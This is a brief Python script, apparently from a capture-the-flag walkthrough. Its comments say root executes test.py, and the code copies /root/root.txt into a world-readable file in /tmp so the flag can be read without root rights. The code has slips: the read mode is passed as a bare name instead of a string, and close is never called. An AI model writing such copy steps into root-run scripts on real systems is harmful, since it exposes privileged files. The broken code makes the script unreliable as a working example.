#############################################################
#File test.py is opened by root and executed
# ==========================================
#create python script to read /root/root.txt

f=open("/root/root.txt", r)

#create line to store contents of root.txt into var

flag = f.read()

# open another file to write flag

with open('/tmp/hRtF', 'w') as g:
    g.write(flag)

g.close

